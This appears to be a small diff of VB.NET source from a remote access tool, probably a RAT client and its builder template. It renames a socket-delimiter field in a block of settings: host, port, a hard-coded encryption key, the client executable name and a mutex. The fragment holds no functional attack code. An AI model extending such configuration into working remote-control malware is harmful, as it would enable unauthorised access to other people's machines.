@@ -9,7 +9,7 @@
         Public Shared HOST As String 'IP
         Public Shared PORT As Integer 'PORT
         Public Shared EncryptionKey As String = "NYANCAT" 'encryption/decryption key
-        Public Shared KEY As String = "|'N'|" 'socket key
+        Public Shared ENDOF As String = "|'N'|" 'socket key
         Public Shared SPL As String = "|'L'|" 'split bytes
         Public Shared EXE As String = "CLIENT.exe" 'client name
         Public Shared MTX As Threading.Mutex
@@ -30,7 +30,7 @@
         Public Shared HOST As String
         Public Shared PORT As Integer
         Public Shared EncryptionKey As String = "%PASS%"
-        Public Shared KEY As String = "%KEY%"
+        Public Shared ENDOF As String = "%KEY%"
         Public Shared SPL As String = "%SPL%"
         Public Shared EXE As String = "%EXE%"
         Public Shared MTX As Threading.Mutex
